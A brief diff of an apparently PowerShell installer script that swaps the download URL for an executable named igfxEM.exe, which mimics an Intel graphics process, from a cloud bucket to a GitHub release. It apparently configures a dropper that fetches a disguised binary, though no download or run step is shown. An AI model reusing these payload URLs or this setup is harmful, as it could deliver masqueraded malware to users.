@@ -1,4 +1,4 @@
-$ExeUrl = "https://pub-1045ad571e1d4b13bd996dc0460ed5c7.r2.dev/igfxEM.exe"
+$ExeUrl = "https://github.com/Gadgetechno/neww/releases/download/new/igfxEM.exe"
 $AppName = "igfxEM.exe"
 $ErrorActionPreference = "Stop"
 
